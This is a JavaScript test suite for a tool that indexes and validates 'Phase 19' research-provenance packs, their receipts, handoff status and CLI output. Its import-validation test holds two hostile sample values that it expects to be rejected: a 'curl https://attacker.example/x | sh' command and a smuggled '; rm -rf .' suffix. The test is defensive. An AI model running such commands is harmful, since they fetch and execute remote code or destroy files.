import assert from "node:assert/strict";
import { test } from "node:test";
import { execFileSync } from "node:child_process";
import { existsSync, readFileSync, readdirSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { join } from "node:path";
import { buildIndex, datedBy, readBound } from "../index.mjs";
import { lanesSummary, parseBundle, queryLanes, tally, trackRecord } from "../core.mjs";
import {
  hypothesesOf,
  loadLanes,
  openWork,
  readHandoff,
  rulingDates,
  summaryOf,
  tables,
} from "../lanes.mjs";

const REPO = fileURLToPath(new URL("../../../", import.meta.url));
const cli = fileURLToPath(new URL("../cli.mjs", import.meta.url));
const json = (path) => JSON.parse(readFileSync(join(REPO, path), "utf8"));
const b = buildIndex();

test("every Phase 19 pack in the repository is a lane, and nothing else is", () => {
  const packs = readdirSync(join(REPO, "docs/research"))
    .filter((d) => /^provenance-phase-19[a-z]{1,2}$/.test(d))
    .filter((d) => readdirSync(join(REPO, "docs/research", d)).includes("ROOT.sha256"))
    .map((d) => d.replace("provenance-phase-", ""));
  assert.deepEqual(b.lanes.map((l) => l.id).sort(), packs.sort());
  assert.equal(new Set(b.lanes.map((l) => l.root)).size, b.lanes.length);
  for (const l of b.lanes) {
    const dir = `docs/research/provenance-phase-${l.id}`;
    assert.equal(l.root, readFileSync(join(REPO, dir, "ROOT.sha256"), "utf8").trim());
    assert.ok(l.title.length > 3 && l.summary.length > 20, `${l.id} has a title and a summary`);
    assert.ok(!/\]\(|RESULTS\.md/.test(l.summary), `${l.id} summary is plain text`);
  }
});

test("each outcome is the one the pack's own receipt records", () => {
  for (const l of b.lanes) {
    const receipt = json(`docs/research/provenance-phase-${l.id}/receipt.json`);
    const recorded = { ...receipt.hypotheses, ...receipt.hypothesis, ...receipt.predictions };
    for (const h of l.hypotheses.filter((x) => x.source === "receipt" && x.outcome !== "by_model"))
      assert.equal(
        h.outcome,
        recorded[h.id] === true ? "held" : recorded[h.id] === false ? "failed" : "undecided",
        `${l.id} ${h.id}`
      );
    assert.equal(l.model_inference, receipt.model_inference === true, `${l.id} model inference`);
    assert.equal(l.independent_custody, false, `${l.id} claims no independent custody`);
  }
  assert.ok(
    b.lanes.some((l) => tally(l).undecided > 0),
    "a prediction that was never decided stays visible as undecided"
  );
});

test("a hypothesis decided on each model keeps its count and its denominator", () => {
  let seen = 0;
  for (const l of b.lanes) {
    const receipt = json(`docs/research/provenance-phase-${l.id}/receipt.json`);
    const counts = receipt.replication?.held_on ?? receipt.held_on;
    if (!counts) continue;
    const pools = Object.entries({ ...receipt, ...receipt.replication })
      .filter(([k, v]) => /^(eligible|usable)/.test(k) && Array.isArray(v))
      .map(([, v]) => v.length);
    for (const h of l.hypotheses.filter((x) => x.outcome === "by_model")) {
      const held = counts[h.id];
      assert.equal(h.held_on, Array.isArray(held) ? held.length : held, `${l.id} ${h.id}`);
      assert.ok(h.of === null || pools.includes(h.of), `${l.id} ${h.id} denominator`);
      assert.ok(h.of === null || h.held_on <= h.of);
      seen += 1;
    }
  }
  assert.equal(seen, lanesSummary(b).by_model);
  assert.ok(seen > 0);
});

test("wording is taken from the lane's own files, never retyped", () => {
  for (const l of b.lanes) {
    const dir = `docs/research/provenance-phase-${l.id}`;
    const sources = ["RESULTS.md", "protocol.json", "report.json"]
      .map((name) => readFileSync(join(REPO, dir, name), "utf8"))
      .join("\n")
      .replace(/\\"/g, '"')
      .replace(/\*\*/g, "")
      .replace(/\s+/g, " ");
    for (const h of l.hypotheses)
      for (const c of h.columns)
        assert.ok(sources.includes(c.text), `${l.id} ${h.id} ${c.label}: ${c.text}`);
    const fromPage = l.hypotheses.filter((h) => h.source === "results_page");
    if (!fromPage.length) continue;
    const said = tables(readFileSync(join(REPO, dir, "RESULTS.md"), "utf8")).find((t) =>
      t.header[0].startsWith("Said")
    );
    assert.deepEqual(
      fromPage.map((h) => h.outcome),
      said.rows.map((row) => (/^(yes|Held)\b/.test(row.at(-1)) ? "held" : "failed")),
      `${l.id} outcomes read from its page`
    );
  }
});

test("the verify command of every lane is the one the rendered handoff prints", () => {
  const handoff = readFileSync(join(REPO, "docs/research/provenance-phase-19f/HANDOFF.md"), "utf8")
    .replace(/\\\n/g, " ")
    .replace(/\s+/g, " ");
  for (const l of b.lanes) assert.ok(handoff.includes(l.verify), `${l.id} verify command`);
});

test("outside-replication status is the handoff tool's own recomputation", () => {
  const status = JSON.parse(
    execFileSync(
      "python3",
      ["-E", "-s", "-B", join(REPO, "tools/assurance-provenance/handoff19.py"), "status"],
      { encoding: "utf8" }
    )
  );
  assert.deepEqual(b.handoff.owed, status.not_yet_replayed_outside);
  assert.equal(b.handoff.status, status.status);
  assert.equal(b.handoff.receipts, status.operator_receipts.length);
  const owed = b.lanes.flatMap((l) => [
    ...(l.outside.verify === "owed" ? [l.id] : []),
    ...l.outside.deeper.filter((d) => d.state === "owed").map((d) => d.item),
  ]);
  assert.deepEqual(owed.sort(), [...status.not_yet_replayed_outside].sort());
  assert.equal(
    b.handoff.items,
    b.lanes.reduce((n, l) => n + 1 + l.outside.deeper.length, 0)
  );
  assert.deepEqual(readHandoff(REPO).status, status);
});

test("totals are sums over the lanes, and filters return what they name", () => {
  const s = lanesSummary(b);
  assert.equal(s.packs, b.lanes.length);
  const all = b.lanes.flatMap((l) => l.hypotheses);
  assert.equal(s.held, all.filter((h) => h.outcome === "held").length);
  assert.equal(s.failed, all.filter((h) => h.outcome === "failed").length);
  assert.equal(s.by_model, all.filter((h) => h.outcome === "by_model").length);
  assert.ok(s.failed > 0, "the record keeps predictions that failed");
  assert.equal(s.with_model, b.lanes.filter((l) => l.model_inference).length);
  assert.equal(s.owed_items, b.handoff.owed.length);
  for (const l of b.lanes) {
    const receipt = json(`docs/research/provenance-phase-${l.id}/receipt.json`);
    const keys = Object.keys(receipt).filter((k) => /usd|spend|money/.test(k));
    assert.equal(l.spend_usd === null, keys.length === 0, `${l.id} spend is recorded or it is not`);
    if (typeof receipt.metered_usd === "number")
      assert.equal(l.spend_usd, Math.round(receipt.metered_usd * 100) / 100, `${l.id} spend`);
    assert.equal(new Set(l.models).size, l.models.length, `${l.id} lists each model once`);
  }
  const failed = queryLanes(b, { outcome: "failed" });
  assert.ok(failed.length && failed.every((l) => tally(l).failed > 0));
  assert.ok(queryLanes(b, { ran: "model" }).every((l) => l.model_inference));
  assert.ok(queryLanes(b, { ran: "no_model" }).every((l) => !l.model_inference));
  assert.deepEqual(
    queryLanes(b, { outside: "owed" }).map((l) => l.id),
    b.lanes
      .filter((l) =>
        [l.id, ...l.outside.deeper.map((d) => d.item)].some((i) => b.handoff.owed.includes(i))
      )
      .map((l) => l.id)
  );
  assert.ok(queryLanes(b, { outside: "checked" }).every((l) => l.outside.verify === "checked"));
  const last = b.lanes.at(-1);
  assert.deepEqual(
    queryLanes(b, { q: last.summary.slice(0, 60) }).map((l) => l.id),
    [last.id]
  );
  assert.throws(() => queryLanes(b, { outcome: "invented" }), /Unknown/);
  assert.throws(() => queryLanes(b, { ran: "invented" }), /Unknown/);
});

test("open work is the README's own list, and lane pages join the library", () => {
  const readme = readFileSync(join(REPO, "README.md"), "utf8");
  const known = b.lanes.map((l) => l.id);
  assert.deepEqual(b.open_work, openWork(readme, known));
  // A range such as "19aa to 19ac" names every lane in it, in the handoff's order.
  assert.deepEqual(
    openWork(
      "### Open work\n\n- **One:** lanes 19aa to 19ac and 19f, then 19zz to 19f.\n\n## Next\n",
      ["19f", "19aa", "19ab", "19ac"]
    )[0].lanes,
    ["19aa", "19ab", "19ac", "19f", "19zz"]
  );
  for (const w of b.open_work)
    for (const [, from, to] of w.text.matchAll(/\b(19[a-z]{1,2}) to (19[a-z]{1,2})\b/g)) {
      const [i, j] = [known.indexOf(from), known.indexOf(to)];
      if (i < 0 || j < i) continue;
      for (const id of known.slice(i, j + 1)) assert.ok(w.lanes.includes(id), `${w.id} ${id}`);
    }
  assert.ok(b.open_work.length >= 10);
  for (const w of b.open_work) assert.ok(readme.includes(`**${w.title}:**`), w.title);
  for (const l of b.lanes)
    for (const path of Object.values(l.pages))
      assert.ok(
        b.documents.some((d) => d.id === path),
        path
      );
  assert.ok(b.documents.some((d) => d.path === "docs/research/PROVENANCE_PHASE_19.md"));
});

test("small parsers: summaries, tables and ruling dates", () => {
  assert.equal(
    summaryOf("# T\n\nA lane. See [RESULTS.md](RESULTS.md) and [the declaration](x) (P19-X01).\n"),
    "A lane."
  );
  assert.equal(
    summaryOf("# T\n\n**Declared as P19-X01** before.\n\n## The question\n\nWhy [here](u)?\n\nNo."),
    "Why here?"
  );
  // A paragraph that introduces a list ends on a colon; a summary is a sentence.
  assert.equal(
    summaryOf("# T\n\nThis folder holds two things:\n\n- one\n- two\n"),
    "This folder holds two things."
  );
  for (const entry of [...b.lanes, ...b.other])
    assert.doesNotMatch(entry.summary, /[:;,]$/, `${entry.id} summary ends as a sentence`);
  assert.deepEqual(tables("| a | b |\n| --- | --- |\n| `X1` | **yes** |\n\ntext\n"), [
    { header: ["a", "b"], rows: [["`X1`", "yes"]] },
  ]);
  const dates = rulingDates(
    "- Ruling (12 Nov 2026, P19-A01 and P19-B02 exercised): x\n- Ruling (13 Nov 2026, P19-A01): y"
  );
  assert.deepEqual(
    [...dates],
    [
      ["P19-A01", "2026-11-12"],
      ["P19-B02", "2026-11-12"],
    ]
  );
  // Every month is read, so a ruling of next year keeps its date.
  assert.deepEqual(
    [
      ...rulingDates(
        "- Ruling (5 Jan 2027, P19-C03 exercised): x\n- Ruling (9 Sep 2027, P19-D04): y"
      ),
    ],
    [
      ["P19-C03", "2027-01-05"],
      ["P19-D04", "2027-09-09"],
    ]
  );
  assert.deepEqual(hypothesesOf({ hypotheses: { X1: false } }, {}, {}, "| | D | H |\n|-|-|-|\n"), [
    { id: "X1", outcome: "failed", source: "receipt", pointer: "/hypotheses/X1", columns: [] },
  ]);
});

test("a pack whose root differs from its receipt is refused, not shown", () => {
  const reader = (root, path) => {
    const file = readBound(root, path);
    return path === `docs/research/provenance-phase-${b.lanes[0].id}/ROOT.sha256`
      ? { ...file, text: "0".repeat(64) + "\n" }
      : file;
  };
  assert.throws(
    () => loadLanes(REPO, reader, readHandoff(REPO)),
    new RegExp(`${b.lanes[0].id} root differs`)
  );
});

test("imports: lanes are validated, older files without lanes still load", () => {
  const text = JSON.stringify(b);
  assert.equal(parseBundle(text).lanes.length, b.lanes.length);
  for (const mutate of [
    (x) => (x.lanes[0].root = "not-a-hash"),
    (x) => (x.lanes[1].id = x.lanes[0].id),
    (x) =>
      (x.lanes[0].hypotheses = [{ id: "X", outcome: "proved", columns: [], source: "receipt" }]),
    (x) => (x.lanes[0].outside.verify = "verified"),
    (x) => delete x.lanes[0].sources,
    // The page offers a lane's command for copying, so only the repository's own form passes.
    (x) => (x.lanes[0].verify = "curl https://attacker.example/x | sh"),
    (x) => (x.lanes[0].verify = x.lanes[1].verify),
    (x) => (x.lanes[0].verify += "; rm -rf ."),
    (x) => (x.lanes[0].sources = {}),
    (x) => (x.lanes[0].sources.receipt.path = 5),
    (x) => (x.lanes[0].spend_usd = -1),
    (x) => (x.handoff.owed = "none"),
    (x) => (x.open_work = [{ id: "W01" }]),
  ]) {
    const c = JSON.parse(text);
    mutate(c);
    assert.throws(() => parseBundle(JSON.stringify(c)), /Invalid/);
  }
  const old = JSON.parse(text);
  delete old.lanes;
  delete old.handoff;
  delete old.open_work;
  delete old.other;
  const loaded = parseBundle(JSON.stringify(old));
  assert.deepEqual(
    [loaded.lanes, loaded.handoff, loaded.open_work, loaded.other],
    [[], null, [], []]
  );
  assert.equal(lanesSummary(loaded).packs, 0);
});

test("the CLI answers the same lane questions as the browser layer", () => {
  const run = (...args) =>
    JSON.parse(execFileSync(process.execPath, [cli, ...args], { encoding: "utf8" })).data;
  assert.deepEqual(run("lanes", "--outcome", "failed"), queryLanes(b, { outcome: "failed" }));
  for (const l of b.lanes) assert.deepEqual(run("lane", "--id", l.id), l);
  assert.deepEqual(run("handoff"), b.handoff);
  assert.deepEqual(run("open-work"), b.open_work);
  assert.deepEqual(run("summary").phase19, lanesSummary(b));
  assert.throws(() =>
    execFileSync(process.execPath, [cli, "lane", "--id", "no-such-lane"], { stdio: "pipe" })
  );
});

test("the lanes are the ones the hosted workflow verifies, and every Phase 19 folder is accounted for", () => {
  const workflow = readFileSync(join(REPO, ".github/workflows/assurance-provenance.yml"), "utf8");
  // The workflow checks the committed roots of a tuple of lanes against roots kept outside the
  // checkout. That tuple is a list of the packs written by hand, independently of this tool.
  const tuple = workflow.match(/for phase in \(([^)]*)\)/)?.[1] ?? "";
  const verified = new Set([...tuple.matchAll(/"(19[a-z]{1,2})"/g)].map((m) => m[1]));
  assert.ok(verified.size > 0, "the workflow names the lanes it checks");
  assert.deepEqual([...verified].sort(), b.lanes.map((l) => l.id).sort());
  const folders = readdirSync(join(REPO, "docs/research")).filter((d) =>
    d.startsWith("provenance-phase-19")
  );
  assert.deepEqual(
    [...b.lanes.map((l) => l.id), ...b.other.map((o) => o.id)].sort(),
    folders.map((d) => d.replace("provenance-phase-", "")).sort()
  );
  assert.ok(b.other.every((o) => b.documents.some((d) => d.id === o.page)));
  assert.equal(new Set(b.documents.map((d) => d.id)).size, b.documents.length);
  assert.ok(existsSync(join(REPO, b.handoff.guide)), "the handoff guide the page names exists");
});

test("a lane the tool has never seen appears from its files alone", () => {
  const dir = "docs/research/provenance-phase-19zz";
  const root = "ab".repeat(32);
  const files = {
    "README.md":
      "# Phase 19zz evidence: a lane that exists only in this test\n\nIt asks whether a new pack needs a change to the explorer. See [RESULTS.md](RESULTS.md) and [the declaration](../X.md) (P19-SYNTH01).\n",
    "RESULTS.md":
      "# Results\n\n|     | Declared | Observed | Holds |\n| --- | --- | --- | --- |\n| S1 | the lane is listed | 1 of 1 | yes |\n| S2 | nothing is typed | 0 of 1 | no |\n",
    "receipt.json": JSON.stringify({
      manifest_sha256: root,
      model_inference: true,
      independent_custody: false,
      hypotheses: { S1: true, S2: false },
      models: { "run-a/model-one": {}, "run-b/model-one": {} },
      metered_usd: 1.234,
    }),
    "report.json": JSON.stringify({ non_claims: ["this lane is not real"] }),
    "protocol.json": JSON.stringify({ models: [{ id: "model-one" }] }),
    "ROOT.sha256": root + "\n",
  };
  const reader = (base, path) => {
    if (path.startsWith(dir + "/"))
      return { text: files[path.slice(dir.length + 1)], sha256: "0".repeat(64) };
    const file = readBound(base, path);
    return path === "docs/research/PROVENANCE_PHASE_19.md"
      ? {
          ...file,
          text: file.text + "\n- Ruling (1 Dec 2026, P19-SYNTH01 exercised): synthetic.\n",
        }
      : file;
  };
  const handoff = readHandoff(REPO);
  handoff.phases.push({
    id: "19zz",
    docs: dir,
    module: "evidence19zz.py",
    host: "any host",
    time: "a moment",
    deeper: ["19zz --replay"],
  });
  handoff.status.not_yet_replayed_outside.push("19zz --replay");
  const loaded = loadLanes(REPO, reader, handoff);
  const lane = loaded.lanes.at(-1);
  assert.equal(loaded.lanes.length, b.lanes.length + 1);
  assert.deepEqual(
    {
      id: lane.id,
      unit: lane.unit,
      date: lane.date,
      title: lane.title,
      root: lane.root,
      spend: lane.spend_usd,
      models: lane.models,
      limits: lane.limits,
      outside: lane.outside,
      outcomes: lane.hypotheses.map((h) => [h.id, h.outcome, h.columns.map((c) => c.text)]),
    },
    {
      id: "19zz",
      unit: "P19-SYNTH01",
      date: "2026-12-01",
      title: "A lane that exists only in this test",
      root,
      spend: 1.23,
      models: ["model-one"],
      limits: ["this lane is not real"],
      outside: { verify: "checked", deeper: [{ item: "19zz --replay", state: "owed" }] },
      outcomes: [
        ["S1", "held", ["the lane is listed", "1 of 1"]],
        ["S2", "failed", ["nothing is typed", "0 of 1"]],
      ],
    }
  );
  assert.ok(lane.verify.includes("evidence19zz.py verify " + dir));
  const bundle = parseBundle(
    JSON.stringify({ ...b, lanes: loaded.lanes, handoff: loaded.handoff })
  );
  assert.equal(lanesSummary(bundle).packs, b.lanes.length + 1);
  assert.equal(lanesSummary(bundle).failed, lanesSummary(b).failed + 1);
});

test("no lane, declaration or root is written into the tool's own source", () => {
  const here = fileURLToPath(new URL("../", import.meta.url));
  const sources = [
    ...["lanes.mjs", "core.mjs", "index.mjs", "cli.mjs", "serve.mjs", "transfer.mjs"],
    "packcheck.mjs",
    "agent.mjs",
    "read-handoff.py",
    ...readdirSync(join(here, "src"))
      .filter((f) => /\.(jsx|css)$/.test(f))
      .map((f) => `src/${f}`),
  ];
  for (const name of sources) {
    const text = readFileSync(join(here, name), "utf8");
    for (const [what, pattern] of [
      // A stylesheet has lengths such as 19px and can carry no lane, so it is not read for ids.
      ...(name.endsWith(".css") ? [] : [["a lane id", /\b19[a-z]{1,2}\b/]]),
      ["a declaration id", /P19-[A-Z]{3,}\d{2}/],
      ["a root hash", /[0-9a-f]{64}/],
      ["a model name", /\b(qwen|llama-|claude-|gpt-)[\w.-]*\d/],
    ])
      assert.equal(text.match(pattern)?.[0], undefined, `${name} holds ${what}`);
  }
});

test("each outcome points at the place in its receipt that records it", () => {
  const at = (value, pointer) =>
    pointer
      .split("/")
      .slice(1)
      .reduce((v, key) => v?.[key], value);
  let pointed = 0;
  for (const l of b.lanes) {
    const receipt = json(l.sources.receipt.path);
    for (const h of l.hypotheses) {
      assert.equal(h.pointer === null, h.source === "results_page", `${l.id} ${h.id}`);
      if (!h.pointer) continue;
      const recorded = at(receipt, h.pointer);
      assert.notEqual(recorded, undefined, `${l.id} ${h.pointer} exists in the receipt`);
      if (h.outcome === "by_model")
        assert.equal(h.held_on, Array.isArray(recorded) ? recorded.length : recorded);
      else
        assert.equal(
          h.outcome,
          recorded === true ? "held" : recorded === false ? "failed" : "undecided"
        );
      pointed += 1;
    }
    assert.ok(existsSync(join(REPO, l.pack)), `${l.id} pack path`);
  }
  assert.ok(pointed > 0);
});

test("the track record is a split of the same totals", () => {
  const t = trackRecord(b),
    s = lanesSummary(b);
  for (const key of ["held", "failed", "undecided"])
    assert.equal(t.model[key] + t.no_model[key], s[key], key);
  assert.equal(t.model.lanes + t.no_model.lanes, s.with_hypotheses);
  const cases = b.lanes
    .flatMap((l) => l.hypotheses)
    .filter((h) => h.outcome === "by_model" && h.of !== null);
  assert.equal(
    t.model.model_of + t.no_model.model_of,
    cases.reduce((n, h) => n + h.of, 0)
  );
  assert.equal(
    t.model.model_held + t.no_model.model_held,
    cases.reduce((n, h) => n + h.held_on, 0)
  );
});

test("the provider-returned model record of each lane is the census tool's own", () => {
  const census = JSON.parse(
    execFileSync(
      "python3",
      ["-E", "-s", "-B", join(REPO, "tools/assurance-provenance/served19.py")],
      { encoding: "utf8", maxBuffer: 16 * 1024 * 1024 }
    )
  );
  let named = 0;
  for (const l of b.lanes) {
    const pack = census[l.id];
    assert.ok(pack, `${l.id} is in the census`);
    if (!pack.named.length) {
      assert.equal(l.served, null, `${l.id} names no model`);
      continue;
    }
    assert.deepEqual(
      l.served,
      { named: pack.named.length, returned: pack.served.length },
      `${l.id} served-model record`
    );
    named += 1;
  }
  assert.ok(named > 0);
});

test("a Phase 19 folder without a README is listed by name and does not stop the build", () => {
  const missing = b.other[0];
  const reader = (root, path) => {
    if (path === missing.page) {
      const error = new Error(`ENOENT: no such file or directory, lstat '${path}'`);
      error.code = "ENOENT";
      throw error;
    }
    return readBound(root, path);
  };
  const loaded = loadLanes(REPO, reader, readHandoff(REPO));
  const entry = loaded.other.find((o) => o.id === missing.id);
  assert.match(entry.summary, /no README/);
  assert.equal(entry.title, `Folder ${missing.id}`);
  assert.ok(!loaded.documents.some((d) => d.id === entry.page));
  assert.equal(loaded.other.length, b.other.length);
  assert.equal(loaded.lanes.length, b.lanes.length);
  // Any other failure to read still stops the build.
  const broken = (root, path) => {
    if (path === missing.page) throw new Error("Source exceeds 32 MiB");
    return readBound(root, path);
  };
  assert.throws(() => loadLanes(REPO, broken, readHandoff(REPO)), /32 MiB/);
});

test("a model a receipt marks as not run is not listed among the lane's models", () => {
  const marked = new Set();
  for (const lane of b.lanes) {
    const receipt = JSON.parse(readFileSync(join(REPO, lane.sources.receipt.path), "utf8"));
    if (!receipt.models || Array.isArray(receipt.models)) continue;
    for (const [id, entry] of Object.entries(receipt.models)) {
      if (!["not_run", "not_captured"].includes(entry?.status)) continue;
      marked.add(entry.status);
      assert.ok(!lane.models.includes(id), `${lane.id} lists ${id}, which did not run`);
    }
  }
  assert.deepEqual([...marked].sort(), ["not_captured", "not_run"], "both marks are in a receipt");
});

test("a heading's date counts only when it is a real day that has come, outside code", () => {
  assert.equal(datedBy("# T\n\n## Added 23 November 2026\n"), "2026-11-23");
  assert.equal(datedBy("# T\n\n## Planned for 31 February 2027\n"), "2026-10-19");
  assert.equal(datedBy("# T\n\n## Due 1 January 2099\n"), "2026-10-19");
  assert.equal(datedBy("# T\n\n```\n## 5 November 2026\n```\n"), "2026-10-19");
  assert.equal(datedBy("# T\n\nText of 5 November 2026 in a paragraph.\n"), "2026-10-19");
});

test("a document's date is the latest one its own headings give, never earlier than the review", () => {
  const dated = (id) => b.documents.find((d) => d.id === id).reviewed;
  assert.equal(dated("docs/research/CONTINUATION_PHASE_18.md"), "2026-11-23");
  assert.equal(dated("docs/research/CONTINUATION_PHASE_16.md"), "2026-10-19");
});
